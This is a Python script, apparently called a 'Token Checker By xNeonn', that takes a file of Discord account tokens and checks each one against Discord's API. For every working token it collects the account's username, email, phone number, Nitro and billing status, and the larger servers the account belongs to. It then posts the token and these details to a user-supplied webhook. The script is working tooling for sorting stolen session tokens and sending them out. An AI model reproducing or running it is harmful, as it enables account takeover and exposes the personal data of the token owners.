import requests

def check_discord_token(token):
    headers = {
        'Authorization': token
    }
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        return None

def get_server_info(token):
    headers = {
        'Authorization': token
    }
    response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        return None

def send_to_webhook(webhook_url, message):
    data = {
        'content': message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print('Token Working | Webhook Sent Successfully')
    else:
        print('Token Not Working | Failed To Send Webhook')

def main():
    webhook_url = input('Webhook URL: ') # Enter Your Webhook URL
    token_file = input('Token File: ') # Enter Your File

    with open(token_file, 'r') as file:
        tokens = file.read().splitlines()

    for token in tokens:
        result = check_discord_token(token)

        if result:
            message = f"====================================\n\n"
            message += f"{token}\n\n"
            message += f"**> Name**: {result.get('username')}\n"
            message += f"**> Email**: {result.get('email', 'N/A')}\n"
            message += f"**> PhoneNumber**: {result.get('phone', 'N/A')}\n"
            message += "====================================\n"
            message += f"**> Nitro**: {'Yes ✅' if result.get('premium_type', 0) else 'No ❌'}\n"
            message += f"**> Billings**: {'Yes ✅' if result.get('billing', None) else 'No ❌'}\n\n"

            server_info = get_server_info(token)
            if server_info:
                message += "**> Servers**:\n"
                for server in server_info:
                    member_count = server.get('member_count')
                    if member_count is not None and member_count > 20: # Only include servers with members
                        message += f"**Name**: {server.get('name')}\n"
                        message += f"**ID**: {server.get('id')}\n"
                        message += f"**Total Members**: {member_count}\n"
                        message += f"**Total Roles**: {len(server.get('roles', []))}\n\n"

            message += f"> @here @everyone | Token Checker By xNeonn\n"

            send_to_webhook(webhook_url, message)

if __name__ == '__main__':
    main()
